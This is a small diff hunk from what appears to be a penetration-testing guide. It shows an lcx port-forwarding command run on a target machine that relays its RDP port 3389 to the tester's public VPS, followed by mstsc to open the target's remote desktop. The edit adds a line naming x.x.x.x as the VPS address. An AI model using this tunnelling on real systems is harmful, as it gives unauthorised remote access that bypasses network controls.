@@ -154,4 +154,4 @@ For target:
 ```shell
 lcx -slave x.x.x.x 2222 127.0.0.1 3389
 ```
-Finally execute ```mstsc x.x.x.x:3333``` to connect to the remote desktop of the target.
+The IP x.x.x.x is the address of your public VPS. Finally execute ```mstsc x.x.x.x:3333``` to connect to the remote desktop of the target.
